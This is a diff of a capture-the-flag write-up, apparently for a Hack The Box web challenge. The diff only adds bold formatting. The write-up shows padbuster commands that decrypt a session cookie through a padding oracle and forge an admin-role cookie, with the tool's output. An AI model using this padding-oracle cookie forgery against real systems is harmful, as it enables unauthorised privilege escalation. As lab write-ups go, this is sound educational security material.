@@ -21,21 +21,21 @@ I googled padbuster and found some basic info on how to use this, and figured ou
 $padbuster http://docker.hackthebox.eu:47167/profile.php q1zsdM2WlN3WRjvJXs8OzbhE4lB5%2BmsmhPBv9cgeGjOKmUeXEsvCZw%3D%3D --cookies "PHPSESSID=3ol2uopq472ov8sigsbmolh9b3;iknowmag1k=q1zsdM2WlN3WRjvJXs8OzbhE4lB5%2BmsmhPBv9cgeGjOKmUeXEsvCZw%3D%3D" 8 --encoding=0
 
 
-And here is what I got: 
+**And here is what I got: **
 
 
 ** Finished **
 [+] Decrypted value (ASCII): {"user":"anders","role":"user"}
 
 
-So I figured: "That's it! Now I just need to change the role from "user" to "admin", and then encode it again and send that as a response!"
+**So I figured:** "That's it! Now I just need to change the role from "user" to "admin", and then encode it again and send that as a response!"
 
 
-So that is what I did:
+**So that is what I did:**
 $padbuster http://docker.hackthebox.eu:47167/profile.php q1zsdM2WlN3WRjvJXs8OzbhE4lB5%2BmsmhPBv9cgeGjOKmUeXEsvCZw%3D%3D --cookies "PHPSESSID=3ol2uopq472ov8sigsbmolh9b3;iknowmag1k=q1zsdM2WlN3WRjvJXs8OzbhE4lB5%2BmsmhPBv9cgeGjOKmUeXEsvCZw%3D%3D" 8 --encoding=0 --plaintext "{\"user\":\"admin\",\"role\":\"admin\"}"
 
 
-Which gave me:
+**Which gave me:**
 ** Finished **
 [+] Encrypted value is: LDRCU61StZbYrdIXPROTGIprI45i7IsYMAovrw2IGp8AAAAAAAAAAA%3D%3D
 So I simply just changed the "iknowmag1k" cookie with the new one and then got the flag.
